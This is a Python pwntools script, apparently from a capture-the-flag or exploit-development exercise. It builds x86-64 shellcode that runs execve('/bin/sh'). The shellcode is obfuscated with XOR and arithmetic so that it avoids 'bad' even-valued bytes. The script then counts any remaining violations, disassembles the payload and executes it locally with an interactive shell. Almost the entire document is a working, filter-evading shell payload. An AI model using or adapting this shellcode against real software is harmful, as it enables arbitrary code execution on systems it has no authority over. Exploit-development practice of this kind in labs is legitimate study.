from pwn import *

context.arch='amd64'
context.os='linux'

shell = asm("""
   /* push 0x68 */
   mov r15b, 0x35
   add r15, 0x33
   push r15

   /* push 0x732f2f2f6e69622f */
   mov r11, ((0x732f2f2f6e69622f-0xffeffff)^0x01010101)
   xor r11, 0x01010101
   add r11, (0xffefffe)
   add r11, 0x1
   push r11

   /* rdi = rsp */
   xchg r9, rsp
   xchg r9, rdi

   /* rsi = 0x0 */
   xor r13, r13
   xchg r13, rsi
 
   /* rdx = 0x0 */
   xor r13, r13
   xchg r13, rdx

   /* rax = 0x3b */
   mov r9b, 0x3b
   xchg r9, rax

   /* execve(rdi="/bin/sh",rsi=0x0,rdx=0x0) */
   syscall
""")

log.info("----------------------------")
log.info("Finding Bad Bytes in Shellcode:")

even_bytes = 0
for b in shell:
    r = (0x123412340000 + b) & 1
    if r==0:
       log.warn("\tBad Byte: %s" %hex(b))
       even_bytes+=1

log.info("----------------------------")
log.info("Total Violations: %i" %even_bytes)
log.info("----------------------------")
log.info(disasm(shell))
log.info("Testing Shellcode Execution")
log.info("----------------------------")
log.info(shell)
p = run_shellcode(shell)
p.interactive()

